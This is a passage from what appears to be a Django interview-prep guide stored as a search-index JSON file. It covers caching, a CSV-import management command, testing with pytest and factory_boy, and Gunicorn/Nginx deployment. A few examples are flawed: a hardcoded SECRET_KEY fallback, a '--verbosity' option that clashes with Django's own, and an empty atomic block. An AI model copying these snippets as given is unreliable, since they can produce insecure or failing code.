Invalidation","text":"<p>Ensure cached data is updated or cleared when underlying data changes.</p> <p>Example Using Signals: <pre><code>from django.db.models.signals import post_save, post_delete\nfrom django.dispatch import receiver\nfrom django.core.cache import cache\nfrom .models import Product\n\n@receiver([post_save, post_delete], sender=Product)\ndef invalidate_product_cache(sender, instance, **kwargs):\n    cache_key = f\"product_{instance.id}\"\n    cache.delete(cache_key)\n</code></pre></p>"},{"location":"django/django/#b-cache-versioning","title":"b. Cache Versioning","text":"<p>Manage different versions of cached data to handle updates without conflicts.</p> <p>Example: <pre><code>cache.set('product_data_v1', data, version=1)\ndata = cache.get('product_data', version=1)\n</code></pre></p>"},{"location":"django/django/#c-using-cache-backends-with-persistence","title":"c. Using Cache Backends with Persistence","text":"<p>Use cache backends that support data persistence to prevent cache loss on server restarts.</p> <p>Example Using Redis with Persistence: <pre><code># settings.py\nCACHES = {\n    'default': {\n        'BACKEND': 'django_redis.cache.RedisCache',\n        'LOCATION': 'redis://127.0.0.1:6379/1',\n        'OPTIONS': {\n            'CLIENT_CLASS': 'django_redis.client.DefaultClient',\n            'IGNORE_EXCEPTIONS': True,  # Gracefully handle Redis downtime\n        }\n    }\n}\n</code></pre></p>"},{"location":"django/django/#8-best-practices_1","title":"8. Best Practices","text":"<ul> <li>Choose the Right Cache Backend: Use Redis or Memcached for production environments due to their performance and scalability.</li> <li>Implement Cache Invalidation: Ensure caches are updated or cleared when data changes to maintain consistency.</li> <li>Avoid Caching Sensitive Data: Do not cache personal or sensitive information unless properly secured.</li> <li>Monitor Cache Performance: Track cache hit rates and performance metrics to optimize caching strategies.</li> <li>Use Vary Headers Appropriately: Ensure cached content varies based on relevant factors like user status or request parameters.</li> <li>Leverage CDN for Static Content: Offload serving static and media files to a Content Delivery Network for improved performance and reduced server load.</li> </ul>"},{"location":"django/django/#9-example-comprehensive-implementation","title":"9. Example: Comprehensive Implementation","text":""},{"location":"django/django/#a-per-view-caching-example","title":"a. Per-View Caching Example","text":"<pre><code># myapp/views.py\nfrom django.views.decorators.cache import cache_page\nfrom django.shortcuts import render\n\n@cache_page(60 * 10)  # Cache for 10 minutes\ndef homepage(request):\n    # Expensive operations\n    context = {'data': expensive_data()}\n    return render(request, 'myapp/homepage.html', context)\n</code></pre>"},{"location":"django/django/#b-template-fragment-caching-example","title":"b. Template Fragment Caching Example","text":"<pre><code>&lt;!-- templates/myapp/homepage.html --&gt;\n{% load cache %}\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Homepage&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;Welcome to the Homepage&lt;/h1&gt;\n\n    {% cache 300 latest_articles %}\n        {% for article in latest_articles %}\n            &lt;div&gt;{{ article.title }}&lt;/div&gt;\n        {% endfor %}\n    {% endcache %}\n\n    &lt;div&gt;\n        &lt;!-- Other dynamic content --&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"django/django/#c-low-level-caching-example","title":"c. Low-Level Caching Example","text":"<pre><code># myapp/utils.py\nfrom django.core.cache import cache\n\ndef get_latest_articles():\n    articles = cache.get('latest_articles')\n    if not articles:\n        articles = fetch_latest_articles_from_db()\n        cache.set('latest_articles', articles, 300)  # Cache for 5 minutes\n    return articles\n</code></pre>"},{"location":"django/django/#d-integrating-in-views","title":"d. Integrating in Views","text":"<pre><code># myapp/views.py\nfrom django.shortcuts import render\nfrom .utils import get_latest_articles\n\ndef homepage(request):\n    latest_articles = get_latest_articles()\n    return render(request, 'myapp/homepage.html', {'latest_articles': latest_articles})\n</code></pre>"},{"location":"django/django/#10-advanced-caching-considerations","title":"10. Advanced Caching Considerations","text":""},{"location":"django/django/#a-fragment-cache-with-varying-context","title":"a. Fragment Cache with Varying Context","text":"<p>Cache fragments based on user-specific data to serve personalized content.</p> <pre><code>{% cache 300 sidebar request.user.username %}\n    {% include 'myapp/user_sidebar.html' %}\n{% endcache %}\n</code></pre>"},{"location":"django/django/#b-using-cache-aliases","title":"b. Using Cache Aliases","text":"<p>Define multiple cache backends for different caching needs.</p> <pre><code># settings.py\nCACHES = {\n    'default': {\n        'BACKEND': 'django_redis.cache.RedisCache',\n        'LOCATION': 'redis://127.0.0.1:6379/1',\n    },\n    'sessions': {\n        'BACKEND': 'django_redis.cache.RedisCache',\n        'LOCATION': 'redis://127.0.0.1:6379/2',\n    },\n}\n</code></pre> <p>Usage: <pre><code>from django.core.cache import caches\n\nsession_cache = caches['sessions']\nsession_cache.set('session_key', session_data, timeout=3600)\n</code></pre></p>"},{"location":"django/django/#c-optimizing-cache-keys","title":"c. Optimizing Cache Keys","text":"<p>Use meaningful and unique cache keys to prevent collisions and ensure efficient retrieval.</p> <p>Example: <pre><code>def get_product_cache_key(product_id):\n    return f\"product_{product_id}_details\"\n</code></pre></p>"},{"location":"django/django/#d-asynchronous-cache-operations","title":"d. Asynchronous Cache Operations","text":"<p>For high-performance applications, consider asynchronous cache operations using <code>channels</code> or <code>async</code> libraries.</p> <p>Example with <code>django-redis</code>: <pre><code>import asyncio\nfrom django.core.cache import cache\n\nasync def async_cache_set(key, value, timeout=300):\n    loop = asyncio.get_event_loop()\n    await loop.run_in_executor(None, cache.set, key, value, timeout)\n</code></pre></p> <p>Conclusion: Django's versatile caching framework allows developers to implement various strategies tailored to different application needs. By effectively using per-view caching, template fragment caching, low-level caching, and adhering to advanced caching practices, applications can achieve significant performance improvements and handle increased traffic efficiently.</p>"},{"location":"django/django/#8-custom-management-commands","title":"8. Custom Management Commands","text":"<p>Question: How can you create custom management commands in Django? Provide an example of a custom command that performs a specific task, such as importing data from a CSV file into the database.</p> <p>Answer:</p> <p>Custom management commands extend Django\u2019s <code>manage.py</code> utility, enabling automation of repetitive tasks like data imports, exports, maintenance operations, and more.</p>"},{"location":"django/django/#1-creating-custom-management-commands","title":"1. Creating Custom Management Commands","text":"<p>Step-by-Step Implementation:</p>"},{"location":"django/django/#a-directory-structure","title":"a. Directory Structure","text":"<p>Within a Django app, create a <code>management/commands</code> directory structure.</p> <pre><code>myapp/\n\u251c\u2500\u2500 management/\n\u2502   \u251c\u2500\u2500 __init__.py\n\u2502   \u2514\u2500\u2500 commands/\n\u2502       \u251c\u2500\u2500 __init__.py\n\u2502       \u2514\u2500\u2500 import_csv.py\n</code></pre>"},{"location":"django/django/#b-define-the-custom-command","title":"b. Define the Custom Command","text":"<p>Example: Importing Data from a CSV File into the <code>Product</code> Model.</p> <pre><code># myapp/management/commands/import_csv.py\nimport csv\nfrom django.core.management.base import BaseCommand, CommandError\nfrom myapp.models import Product\n\nclass Command(BaseCommand):\n    help = 'Import products from a CSV file'\n\n    def add_arguments(self, parser):\n        parser.add_argument('csv_file', type=str, help='Path to the CSV file to import')\n        parser.add_argument(\n            '--update',\n            action='store_true',\n            help='Update existing products instead of creating new ones',\n        )\n\n    def handle(self, *args, **options):\n        csv_file = options['csv_file']\n        update = options['update']\n        try:\n            with open(csv_file, newline='', encoding='utf-8') as f:\n                reader = csv.DictReader(f)\n                for row in reader:\n                    sku = row['sku']\n                    if update:\n                        product, created = Product.objects.update_or_create(\n                            sku=sku,\n                            defaults={\n                                'name': row['name'],\n                                'description': row['description'],\n                                'price': row['price'],\n                            }\n                        )\n                        status = 'Created' if created else 'Updated'\n                        self.stdout.write(self.style.SUCCESS(f\"{status} Product: {product.name}\"))\n                    else:\n                        Product.objects.create(\n                            sku=sku,\n                            name=row['name'],\n                            description=row['description'],\n                            price=row['price'],\n                        )\n                        self.stdout.write(self.style.SUCCESS(f\"Created Product: {row['name']}\"))\n        except FileNotFoundError:\n            raise CommandError(f\"File {csv_file} does not exist\")\n        except KeyError as e:\n            raise CommandError(f\"Missing column in CSV: {e}\")\n        except Exception as e:\n            raise CommandError(f\"An error occurred: {e}\")\n</code></pre> <p>Features: - Arguments:   - <code>csv_file</code>: Positional argument specifying the CSV file path.   - <code>--update</code>: Optional flag to update existing products based on SKU.</p> <ul> <li> <p>Error Handling: Gracefully handles file not found, missing columns, and other exceptions.</p> </li> <li> <p>Output: Provides success messages for created or updated products.</p> </li> </ul>"},{"location":"django/django/#c-running-the-custom-command","title":"c. Running the Custom Command","text":"<p>Execute the command using Django\u2019s <code>manage.py</code>, providing the path to the CSV file.</p> <pre><code>python manage.py import_csv path/to/products.csv\n</code></pre> <p>With Update Flag: <pre><code>python manage.py import_csv path/to/products.csv --update\n</code></pre></p>"},{"location":"django/django/#2-advanced-features","title":"2. Advanced Features","text":""},{"location":"django/django/#a-verbose-mode","title":"a. Verbose Mode","text":"<p>Control the level of output detail.</p> <pre><code>def add_arguments(self, parser):\n    parser.add_argument('csv_file', type=str, help='Path to the CSV file to import')\n    parser.add_argument(\n        '--update',\n        action='store_true',\n        help='Update existing products instead of creating new ones',\n    )\n    parser.add_argument(\n        '--verbosity',\n        type=int,\n        choices=[0, 1, 2],\n        help='Verbosity level; 0=minimal, 1=normal, 2=maximum',\n    )\n</code></pre> <p>Usage: <pre><code>python manage.py import_csv path/to/products.csv --verbosity 2\n</code></pre></p>"},{"location":"django/django/#b-dry-run-option","title":"b. Dry-Run Option","text":"<p>Simulate the import without making database changes.</p> <pre><code>def add_arguments(self, parser):\n    # ... existing arguments ...\n    parser.add_argument(\n        '--dry-run',\n        action='store_true',\n        help='Simulate the import without saving to the database',\n    )\n\ndef handle(self, *args, **options):\n    dry_run = options['dry_run']\n    # Implement logic accordingly\n    if dry_run:\n        self.stdout.write(\"Dry run: No changes will be made to the database.\")\n    # Proceed with import logic\n</code></pre>"},{"location":"django/django/#c-transaction-management","title":"c. Transaction Management","text":"<p>Ensure atomic operations to maintain database integrity.</p> <pre><code>from django.db import transaction\n\ndef handle(self, *args, **options):\n    try:\n        with transaction.atomic():\n            # Import logic\n    except Exception as e:\n        raise CommandError(f\"An error occurred: {e}\")\n</code></pre>"},{"location":"django/django/#3-testing-custom-commands","title":"3. Testing Custom Commands","text":"<p>Ensure custom commands function correctly and handle edge cases.</p> <p>Example Using Django\u2019s Test Framework: <pre><code># myapp/tests/test_commands.py\nfrom django.core.management import call_command\nfrom django.test import TestCase\nfrom myapp.models import Product\nimport os\n\nclass ImportCSVCommandTest(TestCase):\n    def setUp(self):\n        # Create a sample CSV file\n        self.csv_path = 'test_products.csv'\n        with open(self.csv_path, 'w', encoding='utf-8') as f:\n            f.write('sku,name,description,price\\n')\n            f.write('SKU001,Product 1,Description 1,10.99\\n')\n            f.write('SKU002,Product 2,Description 2,19.99\\n')\n\n    def tearDown(self):\n        # Remove the sample CSV file\n        os.remove(self.csv_path)\n\n    def test_import_csv_creation(self):\n        call_command('import_csv', self.csv_path)\n        self.assertEqual(Product.objects.count(), 2)\n        product = Product.objects.get(sku='SKU001')\n        self.assertEqual(product.name, 'Product 1')\n        self.assertEqual(product.price, 10.99)\n\n    def test_import_csv_update(self):\n        Product.objects.create(sku='SKU001', name='Old Product', description='Old Description', price=5.00)\n        call_command('import_csv', self.csv_path, '--update')\n        self.assertEqual(Product.objects.count(), 2)\n        product = Product.objects.get(sku='SKU001')\n        self.assertEqual(product.name, 'Product 1')\n        self.assertEqual(product.price, 10.99)\n</code></pre></p> <p>Conclusion: Custom management commands in Django are powerful tools for automating tasks like data imports, maintenance, and more. By following Django\u2019s conventions and incorporating advanced features such as verbosity control, dry-run options, and transaction management, developers can create robust and reusable commands that enhance application functionality and maintainability.</p>"},{"location":"django/django/#9-testing-strategies-in-django","title":"9. Testing Strategies in Django","text":"<p>Question: What are the best practices for writing tests in Django applications? Discuss how to use Django's testing framework to write unit tests, integration tests, and end-to-end tests. Additionally, explain how to utilize tools like pytest and factory_boy to enhance testing efficiency.</p> <p>Answer:</p> <p>Comprehensive testing ensures Django applications are reliable, maintainable, and free of regressions. Employing a mix of unit, integration, and end-to-end (E2E) tests, alongside tools like <code>pytest</code> and <code>factory_boy</code>, enhances testing efficiency and coverage.</p>"},{"location":"django/django/#1-types-of-tests","title":"1. Types of Tests","text":"<ul> <li>Unit Tests: Test individual components (functions, methods) in isolation.</li> <li>Integration Tests: Test interactions between multiple components or layers.</li> <li>End-to-End (E2E) Tests: Simulate real user scenarios, testing the application as a whole.</li> </ul>"},{"location":"django/django/#2-djangos-built-in-testing-framework","title":"2. Django\u2019s Built-in Testing Framework","text":"<p>Django provides a robust testing framework based on Python\u2019s <code>unittest</code> module.</p>"},{"location":"django/django/#a-unit-tests","title":"a. Unit Tests","text":"<p>Example: Testing a Model Method</p> <pre><code># myapp/models.py\nfrom django.db import models\n\nclass Product(models.Model):\n    name = models.CharField(max_length=100)\n    price = models.DecimalField(max_digits=8, decimal_places=2)\n\n    def is_expensive(self):\n        return self.price &gt; 100\n</code></pre> <pre><code># myapp/tests/test_models.py\nfrom django.test import TestCase\nfrom myapp.models import Product\n\nclass ProductModelTest(TestCase):\n    def test_is_expensive(self):\n        cheap_product = Product.objects.create(name='Cheap', price=50)\n        expensive_product = Product.objects.create(name='Expensive', price=150)\n        self.assertFalse(cheap_product.is_expensive())\n        self.assertTrue(expensive_product.is_expensive())\n</code></pre>"},{"location":"django/django/#b-integration-tests","title":"b. Integration Tests","text":"<p>Example: Testing a View and Template Rendering</p> <pre><code># myapp/views.py\nfrom django.shortcuts import render\nfrom .models import Product\n\ndef product_list(request):\n    products = Product.objects.all()\n    return render(request, 'myapp/product_list.html', {'products': products})\n</code></pre> <pre><code># myapp/tests/test_views.py\nfrom django.test import TestCase\nfrom django.urls import reverse\nfrom myapp.models import Product\n\nclass ProductListViewTest(TestCase):\n    def setUp(self):\n        Product.objects.create(name='Product 1', price=10.99)\n        Product.objects.create(name='Product 2', price=19.99)\n\n    def test_product_list_view(self):\n        response = self.client.get(reverse('product_list'))\n        self.assertEqual(response.status_code, 200)\n        self.assertContains(response, 'Product 1')\n        self.assertContains(response, 'Product 2')\n        self.assertTemplateUsed(response, 'myapp/product_list.html')\n</code></pre>"},{"location":"django/django/#c-end-to-end-e2e-tests","title":"c. End-to-End (E2E) Tests","text":"<p>Example Using Selenium and <code>LiveServerTestCase</code>:</p> <pre><code>pip install selenium\n</code></pre> <pre><code># myapp/tests/test_e2e.py\nfrom django.test import LiveServerTestCase\nfrom selenium import webdriver\nfrom django.urls import reverse\nfrom myapp.models import Product\n\nclass ProductListE2ETest(LiveServerTestCase):\n    def setUp(self):\n        self.browser = webdriver.Firefox()\n        Product.objects.create(name='Product 1', price=10.99)\n\n    def tearDown(self):\n        self.browser.quit()\n\n    def test_can_view_product_list(self):\n        self.browser.get(self.live_server_url + reverse('product_list'))\n        body = self.browser.find_element_by_tag_name('body').text\n        self.assertIn('Product 1', body)\n</code></pre> <p>Advanced E2E Testing with Headless Browsers:</p> <p>Use headless browsers like Chrome Headless for faster testing environments.</p> <pre><code>from selenium.webdriver.chrome.options import Options\n\ndef setUp(self):\n    chrome_options = Options()\n    chrome_options.add_argument(\"--headless\")\n    self.browser = webdriver.Chrome(options=chrome_options)\n</code></pre>"},{"location":"django/django/#3-enhancing-testing-with-pytest","title":"3. Enhancing Testing with <code>pytest</code>","text":"<p><code>pytest</code> offers a more flexible and feature-rich testing framework compared to Django\u2019s default <code>unittest</code>-based framework.</p>"},{"location":"django/django/#a-installation-and-configuration","title":"a. Installation and Configuration","text":"<pre><code>pip install pytest pytest-django\n</code></pre> <p>Create a <code>pytest.ini</code> in the project root.</p> <pre><code># pytest.ini\n[pytest]\nDJANGO_SETTINGS_MODULE = myproject.settings\npython_files = tests.py test_*.py *_tests.py\n</code></pre>"},{"location":"django/django/#b-writing-tests-with-pytest","title":"b. Writing Tests with <code>pytest</code>","text":"<p>Example: <pre><code># myapp/tests/test_models.py\nimport pytest\nfrom myapp.models import Product\n\n@pytest.mark.django_db\ndef test_is_expensive():\n    cheap_product = Product.objects.create(name='Cheap', price=50)\n    expensive_product = Product.objects.create(name='Expensive', price=150)\n    assert not cheap_product.is_expensive()\n    assert expensive_product.is_expensive()\n</code></pre></p> <p>Advantages: - Fixture Management: More flexible fixtures with <code>@pytest.fixture</code>. - Better Assertions: Enhanced assertion introspection for clearer error messages. - Plugin Ecosystem: Access to a rich set of plugins for extended functionality (e.g., coverage, mocking).</p>"},{"location":"django/django/#4-enhancing-testing-with-factory_boy","title":"4. Enhancing Testing with <code>factory_boy</code>","text":"<p><code>factory_boy</code> is a fixtures replacement tool that helps create test data efficiently and flexibly.</p>"},{"location":"django/django/#a-installation","title":"a. Installation","text":"<pre><code>pip install factory_boy\n</code></pre>"},{"location":"django/django/#b-defining-factories","title":"b. Defining Factories","text":"<p>Example:</p> <pre><code># myapp/tests/factories.py\nimport factory\nfrom django.contrib.auth.models import User\nfrom myapp.models import Product\n\nclass UserFactory(factory.django.DjangoModelFactory):\n    class Meta:\n        model = User\n\n    username = factory.Faker('user_name')\n    email = factory.Faker('email')\n    password = factory.PostGenerationMethodCall('set_password', 'password123')\n\nclass ProductFactory(factory.django.DjangoModelFactory):\n    class Meta:\n        model = Product\n\n    name = factory.Faker('word')\n    price = factory.Faker('pydecimal', left_digits=4, right_digits=2, positive=True)\n</code></pre>"},{"location":"django/django/#c-using-factories-in-tests","title":"c. Using Factories in Tests","text":"<p>Example:</p> <pre><code># myapp/tests/test_views.py\nimport pytest\nfrom django.urls import reverse\nfrom .factories import ProductFactory\n\n@pytest.mark.django_db\ndef test_product_list_view(client):\n    products = ProductFactory.create_batch(5)\n    response = client.get(reverse('product_list'))\n    assert response.status_code == 200\n    for product in products:\n        assert product.name in response.content.decode()\n</code></pre> <p>Advanced Usage: - Trait Definitions: Create variations of factories.   <pre><code>class ProductFactory(factory.django.DjangoModelFactory):\n    class Meta:\n        model = Product\n\n    name = factory.Faker('word')\n    price = factory.Faker('pydecimal', left_digits=4, right_digits=2, positive=True)\n\n    class Params:\n        expensive = factory.Trait(\n            price=150\n        )\n</code></pre> Usage: <pre><code>expensive_product = ProductFactory(expensive=True)\n</code></pre></p>"},{"location":"django/django/#5-additional-testing-best-practices","title":"5. Additional Testing Best Practices","text":""},{"location":"django/django/#a-isolate-tests","title":"a. Isolate Tests","text":"<p>Ensure tests do not depend on each other and can run in any order. Use <code>setUp</code> and <code>tearDown</code> methods or fixtures to prepare test environments.</p>"},{"location":"django/django/#b-use-test-coverage-tools","title":"b. Use Test Coverage Tools","text":"<p>Measure test coverage to identify untested code areas.</p> <pre><code>pip install coverage\ncoverage run -m pytest\ncoverage report\n</code></pre>"},{"location":"django/django/#c-mock-external-dependencies","title":"c. Mock External Dependencies","text":"<p>Use mocking to simulate external services, APIs, or complex objects.</p> <p>Example Using <code>unittest.mock</code>: <pre><code>from unittest.mock import patch\n\n@patch('myapp.utils.send_email')\ndef test_user_registration(mock_send_email, client):\n    response = client.post('/register/', data={'username': 'testuser', 'password': 'pass'})\n    assert response.status_code == 302\n    mock_send_email.assert_called_once()\n</code></pre></p>"},{"location":"django/django/#d-continuous-integration-ci","title":"d. Continuous Integration (CI)","text":"<p>Integrate tests into CI pipelines (e.g., GitHub Actions, GitLab CI) to run tests automatically on commits and pull requests.</p> <p>Example GitHub Actions Workflow: <pre><code>name: Django CI\n\non:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    services:\n      postgres:\n        image: postgres:12\n        env:\n          POSTGRES_USER: postgres\n          POSTGRES_PASSWORD: postgres\n          POSTGRES_DB: test_db\n        ports:\n          - 5432:5432\n        options: &gt;-\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n\n    steps:\n    - uses: actions/checkout@v2\n    - name: Set up Python\n      uses: actions/setup-python@v2\n      with:\n        python-version: '3.9'\n    - name: Install dependencies\n      run: |\n        python -m pip install --upgrade pip\n        pip install -r requirements.txt\n    - name: Run tests\n      env:\n        DATABASE_URL: postgres://postgres:postgres@localhost:5432/test_db\n      run: |\n        pytest\n</code></pre></p>"},{"location":"django/django/#e-test-naming-conventions","title":"e. Test Naming Conventions","text":"<p>Use clear and descriptive names for test functions and classes to improve readability and maintainability.</p> <p>Example: <pre><code>def test_product_creation():\n    pass\n\ndef test_user_registration_sends_email():\n    pass\n</code></pre></p>"},{"location":"django/django/#6-example-comprehensive-testing-with-pytest-and-factory_boy","title":"6. Example: Comprehensive Testing with <code>pytest</code> and <code>factory_boy</code>","text":""},{"location":"django/django/#a-defining-factories","title":"a. Defining Factories","text":"<pre><code># myapp/tests/factories.py\nimport factory\nfrom django.contrib.auth.models import User\nfrom myapp.models import Product\n\nclass UserFactory(factory.django.DjangoModelFactory):\n    class Meta:\n        model = User\n\n    username = factory.Faker('user_name')\n    email = factory.Faker('email')\n    password = factory.PostGenerationMethodCall('set_password', 'password123')\n\nclass ProductFactory(factory.django.DjangoModelFactory):\n    class Meta:\n        model = Product\n\n    name = factory.Faker('word')\n    price = factory.Faker('pydecimal', left_digits=4, right_digits=2, positive=True)\n</code></pre>"},{"location":"django/django/#b-writing-a-view-test-using-pytest-and-factory_boy","title":"b. Writing a View Test Using <code>pytest</code> and <code>factory_boy</code>","text":"<pre><code># myapp/tests/test_views.py\nimport pytest\nfrom django.urls import reverse\nfrom .factories import ProductFactory\n\n@pytest.mark.django_db\ndef test_product_list_view(client):\n    products = ProductFactory.create_batch(5)\n    response = client.get(reverse('product_list'))\n    assert response.status_code == 200\n    for product in products:\n        assert product.name in response.content.decode()\n</code></pre>"},{"location":"django/django/#c-testing-a-model-method","title":"c. Testing a Model Method","text":"<pre><code># myapp/tests/test_models.py\nimport pytest\nfrom myapp.models import Product\nfrom .factories import ProductFactory\n\n@pytest.mark.django_db\ndef test_product_is_expensive():\n    cheap_product = ProductFactory(price=50)\n    expensive_product = ProductFactory(price=150)\n    assert not cheap_product.is_expensive()\n    assert expensive_product.is_expensive()\n</code></pre>"},{"location":"django/django/#7-best-practices_1","title":"7. Best Practices","text":"<ul> <li>Isolate Tests: Ensure tests are independent and can run in any order.</li> <li>Use Fixtures Effectively: Leverage <code>pytest</code> fixtures for reusable test setups.</li> <li>Mock External Services: Isolate tests from external dependencies to ensure reliability.</li> <li>Maintain High Coverage: Aim for comprehensive test coverage to catch potential issues early.</li> <li>Automate Testing: Integrate tests into CI/CD pipelines for continuous validation.</li> </ul> <p>Conclusion: Implementing a comprehensive testing strategy in Django involves writing unit, integration, and E2E tests, enhanced by tools like <code>pytest</code> and <code>factory_boy</code>. Adhering to best practices ensures robust, maintainable, and reliable applications.</p>"},{"location":"django/django/#10-deployment-and-scalability-of-django-applications","title":"10. Deployment and Scalability of Django Applications","text":"<p>Question: What are the key considerations for deploying a Django application in a production environment? Discuss the roles of WSGI/ASGI servers, application servers (e.g., Gunicorn, Daphne), reverse proxies (e.g., Nginx), and database configurations. Additionally, explain strategies to scale a Django application to handle increased traffic.</p> <p>Answer:</p> <p>Deploying a Django application to production involves configuring servers, proxies, databases, and implementing scalability strategies to ensure performance, security, and reliability.</p>"},{"location":"django/django/#1-key-components-in-deployment","title":"1. Key Components in Deployment","text":"<ul> <li>WSGI/ASGI Servers: Interface between Django and the web server.</li> <li>WSGI: Synchronous interface (e.g., Gunicorn).</li> <li> <p>ASGI: Asynchronous interface (e.g., Daphne, Uvicorn).</p> </li> <li> <p>Application Servers: Manage worker processes handling incoming requests.</p> </li> <li>Gunicorn: Popular WSGI server.</li> <li> <p>Daphne: ASGI server for asynchronous support.</p> </li> <li> <p>Reverse Proxies: Handle client requests, load balancing, SSL termination, and serve static files.</p> </li> <li>Nginx: Common choice for reverse proxying.</li> <li> <p>Apache: Another option with mod_wsgi.</p> </li> <li> <p>Database Configurations: Optimize performance, ensure high availability, and manage connections.</p> </li> <li>PostgreSQL: Preferred for production.</li> <li>Connection Pooling: Use PgBouncer for efficient database connections.</li> </ul>"},{"location":"django/django/#2-deployment-steps-and-considerations","title":"2. Deployment Steps and Considerations","text":""},{"location":"django/django/#a-setting-up-the-web-server-and-application-server","title":"a. Setting Up the Web Server and Application Server","text":"<p>Example Using Gunicorn and Nginx:</p> <ol> <li> <p>Install Gunicorn: <pre><code>pip install gunicorn\n</code></pre></p> </li> <li> <p>Run Gunicorn: <pre><code>gunicorn myproject.wsgi:application --bind 127.0.0.1:8000\n</code></pre></p> </li> <li> <p>Install and Configure Nginx:</p> </li> </ol> <p>Example Nginx Configuration: <pre><code># /etc/nginx/sites-available/myproject\nserver {\n    listen 80;\n    server_name example.com www.example.com;\n\n    location = /favicon.ico { access_log off; log_not_found off; }\n    location /static/ {\n        root /path/to/myproject;\n    }\n\n    location /media/ {\n        root /path/to/myproject;\n    }\n\n    location / {\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_pass http://127.0.0.1:8000;\n    }\n\n    # Optional: Redirect HTTP to HTTPS\n    listen 443 ssl; # managed by Certbot\n    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;\n    include /etc/letsencrypt/options-ssl-nginx.conf;\n    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;\n}\n</code></pre></p> <ol> <li>Enable the Nginx Site and Restart Nginx: <pre><code>sudo ln -s /etc/nginx/sites-available/myproject /etc/nginx/sites-enabled\nsudo systemctl restart nginx\n</code></pre></li> </ol>"},{"location":"django/django/#b-serving-static-and-media-files","title":"b. Serving Static and Media Files","text":"<ul> <li>Static Files:</li> <li>Use <code>collectstatic</code> to gather all static files into a single directory.     <pre><code>python manage.py collectstatic\n</code></pre></li> <li> <p>Serve static files via Nginx or a CDN for better performance.</p> </li> <li> <p>Media Files:</p> </li> <li>Configure Nginx to serve user-uploaded media files securely.     <pre><code>location /media/ {\n    root /path/to/myproject;\n}\n</code></pre></li> </ul>"},{"location":"django/django/#c-database-configuration","title":"c. Database Configuration","text":"<ul> <li>Use a Production-Ready Database:</li> <li>PostgreSQL: Robust features and performance.</li> <li> <p>Configure Connection Pooling:</p> <ul> <li>PgBouncer: Lightweight connection pooler.   <pre><code>sudo apt-get install pgbouncer\n</code></pre> PgBouncer Configuration: <pre><code>[databases]\nmyproject = host=127.0.0.1 port=5432 dbname=myproject\n\n[pgbouncer]\nlisten_addr = 127.0.0.1\nlisten_port = 6432\nauth_type = md5\nauth_file = /etc/pgbouncer/userlist.txt\npool_mode = transaction\nmax_client_conn = 100\ndefault_pool_size = 20\n</code></pre> Run PgBouncer: <pre><code>sudo systemctl start pgbouncer\nsudo systemctl enable pgbouncer\n</code></pre></li> </ul> </li> <li> <p>Optimize Database Settings:</p> </li> <li>Adjust PostgreSQL settings like <code>MAX_CONNECTIONS</code>, <code>WORK_MEM</code>, and <code>MAINTENANCE_WORK_MEM</code> based on workload.</li> </ul>"},{"location":"django/django/#d-security-settings","title":"d. Security Settings","text":"<ul> <li> <p>Set <code>DEBUG = False</code>: <pre><code># settings.py\nDEBUG = False\n</code></pre></p> </li> <li> <p>Configure Allowed Hosts: <pre><code># settings.py\nALLOWED_HOSTS = ['example.com', 'www.example.com']\n</code></pre></p> </li> <li> <p>Enforce HTTPS: <pre><code># settings.py\nSECURE_SSL_REDIRECT = True\nSESSION_COOKIE_SECURE = True\nCSRF_COOKIE_SECURE = True\n</code></pre></p> </li> <li> <p>Secure Secrets:</p> </li> <li>Use environment variables to store sensitive settings like <code>SECRET_KEY</code>.     <pre><code># settings.py\nimport os\n\nSECRET_KEY = os.environ.get('DJANGO_SECRET_KEY', 'unsafe-default-key')\n</code></pre></li> </ul>"},{"location":"django/django/#3-scaling-strategies","title":"3. Scaling Strategies","text":""},{"location":"django/django/#a-horizontal-scaling","title":"a. Horizontal Scaling","text":"<ul> <li>Add More Application Server Instances:</li> <li> <p>Increase Gunicorn workers or deploy multiple Gunicorn instances across different servers.</p> </li> <li> <p>Load Balancing:</p> </li> <li>Use Nginx\u2019s load balancing features or dedicated load balancers to distribute traffic evenly.</li> </ul> <p>Example Nginx Load Balancing Configuration: <pre><code>http {\n    upstream django_app {\n        server 127.0.0.1:8000;\n        server 127.0.0.1:8001;\n        server 127.0.0.1:8002;\n    }\n\n    server {\n        listen 80;\n        server_name example.com;\n\n        location / {\n            proxy_pass http://django_app;\n            proxy_set_header Host $host;\n            proxy_set_header X-Real-IP $remote_addr;\n            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        }\n    }\n}\n</code></pre></p>"},{"location":"django/django/#b-vertical-scaling","title":"b. Vertical Scaling","text":"<ul> <li>Upgrade Server Resources:</li> <li>Increase CPU, memory, and storage on existing servers to handle more load.</li> </ul>"},{"location":"django/django/#c-caching","title":"c. Caching","text":"<ul> <li>Implement Caching Layers:</li> <li> <p>Use Redis or Memcached for caching database queries, session data, and other frequently accessed data.</p> </li> <li> <p>Use a Content Delivery Network (CDN):</p> </li> <li>Offload serving static and media files to a CDN to reduce server load and improve content delivery speed.</li> </ul>"},{"location":"django/django/#d-database-scaling","title":"d. Database Scaling","text":"<ul> <li>Read Replicas:</li> <li>Distribute read operations across multiple database replicas to balance the load.</li> </ul> <p>Example PostgreSQL Read Replica Setup: <pre><code># settings.py\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.postgresql',\n        'NAME': 'myproject',\n        'USER': 'myuser',\n        'PASSWORD': 'mypassword',\n        'HOST': 'primary-db-host',\n        'PORT': '5432',\n    },\n    'replica': {\n        'ENGINE': 'django.db.backends.postgresql',\n        'NAME': 'myproject',\n        'USER': 'myuser',\n        'PASSWORD': 'mypassword',\n        'HOST': 'replica-db-host',\n        'PORT': '5432',\n    }\n}\n</code></pre></p> <ul> <li>Sharding:</li> <li>Partition the database to distribute data across multiple servers.</li> 